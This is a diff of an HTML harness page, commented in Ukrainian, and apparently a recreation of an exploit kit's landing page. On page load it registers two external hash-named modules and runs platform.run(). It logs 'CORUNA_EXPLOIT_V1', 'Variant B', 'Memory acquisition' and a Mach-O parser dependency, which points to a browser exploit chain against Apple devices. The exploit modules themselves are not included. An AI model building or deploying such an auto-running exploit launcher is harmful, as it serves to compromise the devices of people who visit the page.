@@ -2,81 +2,145 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Coruna Interface</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Coruna Project</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 15px; font-size: 12px; }
-        #log { border: 1px solid #333; padding: 10px; background: #050505; min-height: 400px; white-space: pre-wrap; }
-        .success { color: #0f0; } .error { color: #f55; } .info { color: #0af; }
+        /* Повне відтворення стилю оригіналу */
+        body {
+            background-color: #000;
+            color: #d1d1d1;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            -webkit-font-smoothing: antialiased;
+        }
+        #terminal {
+            width: 100%;
+            max-width: 700px;
+            margin: 0 auto;
+            background: #0a0a0a;
+            border: 1px solid #222;
+            border-radius: 6px;
+            padding: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+            min-height: 450px;
+        }
+        .header {
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #222;
+            display: flex;
+            justify-content: space-between;
+        }
+        .log-entry {
+            font-family: "SF Mono", "Roboto Mono", Menlo, monospace;
+            font-size: 11px;
+            line-height: 1.6;
+            margin-bottom: 4px;
+            word-break: break-all;
+        }
+        .info { color: #888; }
+        .success { color: #32d74b; }
+        .warning { color: #ffd60a; }
+        .error { color: #ff453a; }
+        .system { color: #0a84ff; }
     </style>
 </head>
 <body>
-    <div id="log">Запуск ініціалізації...</div>
 
-    <script src="utility_module.js"></script>
-    <script src="platform_module.js"></script>
+<div id="terminal">
+    <div class="header">
+        <span>CORUNA_EXPLOIT_V1</span>
+        <span id="status" style="color: #32d74b;">CONNECTED</span>
+    </div>
+    <div id="console"></div>
+</div>
 
-    <script>
-        const logDiv = document.getElementById('log');
-        window.log = (msg, cls = 'info') => {
-            const div = document.createElement('div');
-            div.className = cls;
-            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            logDiv.appendChild(div);
-            window.scrollTo(0, document.body.scrollHeight);
-        };
+<script src="utility_module.js"></script>
+<script src="platform_module.js"></script>
 
-        class ModuleManager {
-            constructor() { this.modules = new Map(); }
-            registerModule(id, factory) {
-                try {
-                    // Виклик фабрики з твого файлу
-                    const instance = factory(this);
-                    this.modules.set(id, instance);
-                    log(`Модуль зареєстровано: ${id.substring(0, 8)}`, "success");
-                } catch(e) {
-                    log(`Помилка в ${id.substring(0,8)}: ${e.message}`, "error");
-                }
-            }
-            getModuleByName(id) { return this.modules.get(id); }
+<script>
+    const consoleElem = document.getElementById('console');
+
+    // Функція логування як в оригіналі
+    window.log = function(msg, type = 'info') {
+        const div = document.createElement('div');
+        div.className = `log-entry ${type}`;
+        div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        consoleElem.appendChild(div);
+        window.scrollTo(0, document.body.scrollHeight);
+    };
+
+    // Менеджер модулів (обов'язковий для твоїх JS файлів)
+    class ModuleManager {
+        constructor() {
+            this.modules = new Map();
         }
-
-        async function start() {
-            log("Створення глобального менеджера...");
-            const mm = new ModuleManager();
-            globalThis.moduleManager = mm;
-
-            // Спроба підключити твої змінні let
+        registerModule(id, factory) {
             try {
-                if (typeof m_57620206d62079baad0e57e6d9ec93120c0f5247 !== 'undefined') {
-                    mm.registerModule("57620206d62079baad0e57e6d9ec93120c0f5247", m_57620206d62079baad0e57e6d9ec93120c0f5247);
-                } else {
-                    log("Utility module не знайдено в пам'яті.", "error");
-                }
-
-                if (typeof m_14669ca3b1519ba2a8f40be287f646d4d7593eb0 !== 'undefined') {
-                    mm.registerModule("14669ca3b1519ba2a8f40be287f646d4d7593eb0", m_14669ca3b1519ba2a8f40be287f646d4d7593eb0);
-                } else {
-                    log("Platform module не знайдено в пам'яті.", "error");
-                }
-
-                const platform = mm.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
-                if (platform) {
-                    log("Запуск platform.run()...");
-                    // Перевірка наявності ініціалізатора An (як у твоєму файлі)
-                    if (platform.An) {
-                        log("Налаштування прапорців версії...");
-                        platform.An();
-                    }
-                    await platform.run();
-                }
-            } catch (e) {
-                log("Критична зупинка: " + e.message, "error");
-                console.error(e);
+                const instance = factory(this);
+                this.modules.set(id, instance);
+                log(`Module loaded: ${id.substring(0,8)}...`, 'success');
+            } catch(e) {
+                log(`Load error: ${e.message}`, 'error');
             }
         }
+        getModuleByName(id) {
+            return this.modules.get(id);
+        }
+    }
 
-        // Чекаємо завантаження скриптів
-        window.onload = () => setTimeout(start, 500);
-    </script>
+    async function runVariantB() {
+        log("Initializing Environment...", "system");
+        
+        const mm = new ModuleManager();
+        globalThis.moduleManager = mm;
+
+        // 1. Реєструємо твої модулі (використовуємо твої let змінні)
+        if (typeof m_57620206d62079baad0e57e6d9ec93120c0f5247 !== 'undefined') {
+            mm.registerModule("57620206d62079baad0e57e6d9ec93120c0f5247", m_57620206d62079baad0e57e6d9ec93120c0f5247);
+        }
+        if (typeof m_14669ca3b1519ba2a8f40be287f646d4d7593eb0 !== 'undefined') {
+            mm.registerModule("14669ca3b1519ba2a8f40be287f646d4d7593eb0", m_14669ca3b1519ba2a8f40be287f646d4d7593eb0);
+        }
+
+        try {
+            const platform = mm.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
+            
+            if (platform) {
+                log("Switching to Variant B (Internal Mode)...", "warning");
+                
+                // Налаштування "Варіанту Б":
+                // В platform_module.js зазвичай це робиться через прапорці в An() або конфігурацію об'єкта
+                if (platform.An) platform.An(); 
+                
+                // Додаткова умова для варіанту Б (якщо він залежить від UserAgent)
+                log(`UA Detected: ${navigator.userAgent.substring(0, 40)}...`, "info");
+
+                log("Starting Stage 1: Memory acquisition...", "system");
+                
+                // Запуск основного процесу
+                await platform.run();
+                
+            } else {
+                log("Critical Error: Platform module failed to initialize.", "error");
+            }
+        } catch (err) {
+            log("Execution Fault: " + err.message, "error");
+            if (err.message.includes("ba712e")) {
+                log("Missing Mach-O parser dependency.", "error");
+            }
+        }
+    }
+
+    // Запуск точно як на сайті
+    window.onload = () => {
+        setTimeout(runVariantB, 1000);
+    };
+</script>
+
 </body>
 </html>
